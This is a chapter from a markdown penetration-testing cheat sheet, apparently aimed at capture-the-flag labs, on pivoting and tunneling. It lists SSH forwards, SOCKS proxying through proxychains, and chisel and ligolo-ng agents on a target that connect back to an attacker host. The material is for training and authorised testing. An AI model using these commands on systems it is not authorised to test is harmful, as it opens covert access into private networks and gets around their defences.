[◀ Prev: Service Exploitation](13-service-exploitation.md) · [🏠 Index](README.md) · [Next: Exploit Development ▶](15-exploit-development.md)

---

# 14 · Pivoting & Tunneling

## 14.1 SSH Tunneling

```bash
# Local port forward — access internal service through SSH
ssh -L LOCAL_PORT:INTERNAL_HOST:REMOTE_PORT user@$TARGET
# Example: access internal web on 127.0.0.1:8080
ssh -L 8080:127.0.0.1:80 user@$TARGET
curl http://localhost:8080/

# Dynamic SOCKS5 proxy — route all tools through target
ssh -D 1080 -fNT user@$TARGET
# Configure proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.0/24

# Remote port forward — expose attacker port on target
ssh -R 9001:127.0.0.1:4444 user@$TARGET

# Jump host (multi-hop)
ssh -J user@PIVOT user@INTERNAL_TARGET
```

## 14.2 Chisel Tunneling

```bash
# Transfer chisel to target first

# Attacker — start server
chisel server --reverse -p 8080

# Target — connect back
chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 on attacker:1080

# Specific port forward
chisel client ATTACKER:8080 R:9001:127.0.0.1:3306
# Attacker:9001 -> Target:3306

# Use proxychains for all traffic
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
proxychains curl http://10.10.10.5/
```

## 14.3 Ligolo-ng (Best for HTB Pro Labs)

```bash
# Setup TUN interface on Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy on attacker
./proxy -selfcert

# Run agent on target
./agent -connect ATTACKER:11601 -ignore-cert

# In ligolo console:
session       # Select session
ifconfig      # See target's internal network
start         # Start tunnel

# Add route on Kali
sudo ip route add 172.16.1.0/24 dev ligolo
# Now access 172.16.1.x directly from Kali
```

---

[◀ Prev: Service Exploitation](13-service-exploitation.md) · [🏠 Index](README.md) · [Next: Exploit Development ▶](15-exploit-development.md)
